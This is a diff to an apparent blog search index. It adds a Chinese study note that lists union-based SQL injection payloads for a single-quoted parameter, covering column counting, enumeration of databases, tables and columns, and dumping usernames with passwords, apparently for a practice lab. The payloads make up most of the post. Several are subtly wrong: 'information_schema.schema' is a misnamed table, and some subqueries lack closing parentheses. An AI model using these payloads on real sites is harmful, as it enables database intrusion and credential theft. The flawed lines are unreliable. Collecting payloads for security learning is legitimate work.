@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>整理常见的 SQL 注入语句</title>
+      <link href="/organize-common-sql-injection-statements/"/>
+      <url>/organize-common-sql-injection-statements/</url>
+      
+        <content type="html"><![CDATA[<p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p><a id="more"></a><blockquote><p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p></blockquote><p>也就是基于这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol><li>判断当前数据表中有几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure><ol start="2"><li>查看显示位在第几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p></blockquote><ol start="3"><li>显示当前数据库（假设显示位中包含第三位）：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><ol start="4"><li>查看当前数据库中的所有表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure><blockquote><p>函数<code>group_concat()</code>把所有结果都在一行输出</p></blockquote><ol start="5"><li>查询所有数据库：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure><ol start="6"><li>查询某个数据库中的表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure><ol start="7"><li><p>查询某个表中的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure></li><li><p>查询某个表中的字段内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure><blockquote><p>0x3a会被转义位冒号<code>：</code></p></blockquote></li></ol><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Mysql </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Mysql </tag>
+            
+            <tag> Web 安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>认识SQL 注入常见方式</title>
       <link href="/know-common-ways-of-sql-injection/"/>
       <url>/know-common-ways-of-sql-injection/</url>
@@ -13,7 +40,7 @@
       
       <categories>
           
-          <category> Redis </category>
+          <category> Mysql </category>
           
       </categories>
       
@@ -21,6 +48,8 @@
         <tags>
             
             <tag> Mysql </tag>
+            
+            <tag> Web 安全 </tag>
             
         </tags>
       
